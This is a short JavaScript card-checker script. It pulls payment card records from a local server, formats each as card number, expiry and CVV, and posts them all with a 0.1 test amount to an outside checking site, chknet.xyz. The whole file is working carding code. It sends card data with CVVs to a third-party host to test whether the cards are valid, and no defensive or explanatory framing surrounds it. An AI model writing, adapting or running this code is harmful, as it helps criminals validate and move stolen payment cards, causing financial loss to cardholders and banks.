var jsonp_callback = function(arr) {
  // Checker

  var txt = "";

  for( var i = 0; i < arr.length; i++ ) {
      arr[i].mon = arr[i].mon < 10 ? ("0" + arr[i].mon) :  arr[i].mon;
      txt += arr[i].card + "|" + arr[i].mon + arr[i].year + "|" + arr[i].cvv;

      if( !(i == arr.length - 1) )
          txt += ", ";
 
  }
  console.log(txt);
  $.ajax({url:"http://chknet.xyz/index.php", 
    method:"POST",
    data:{
      cardnumbers: txt,
      amount: 0.1,
      submit: "Check+Your+Creditcards+now!"
    },
    success: function(a) {console.log(a)}
    })
}
$.ajax({
     url:"http://localhost:5000/post",
     dataType: "jsonp"
});
